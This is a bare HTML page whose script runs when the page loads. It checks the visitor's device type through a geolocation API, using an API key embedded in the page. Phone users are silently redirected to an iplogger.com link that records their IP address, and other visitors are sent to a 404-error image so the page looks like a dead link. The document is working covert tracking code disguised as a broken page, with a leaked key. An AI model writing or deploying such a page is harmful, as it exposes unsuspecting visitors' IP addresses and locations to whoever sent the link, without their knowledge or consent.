<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title></title>
</head>
<body>

	<script type="text/javascript">
		const api_url = "https://api.ipgeolocation.io/user-agent?apiKey=5ac4527ca1574312b2fa53e398772254"
		async function getISS(){
			const response = await fetch(api_url);
			const data = await response.json();
			var iSmobile = data.device.type;

			console.log(iSmobile)
		if (iSmobile == "Phone") {
			window.location.replace("https://iplogger.com/2XYCv4");
		} 
			else {
				window.location.replace("https://lapraim.com/assets/images/insights/404-error/404-error.jpg");
			}
		}

		getISS();
	</script>

</body>
</html>
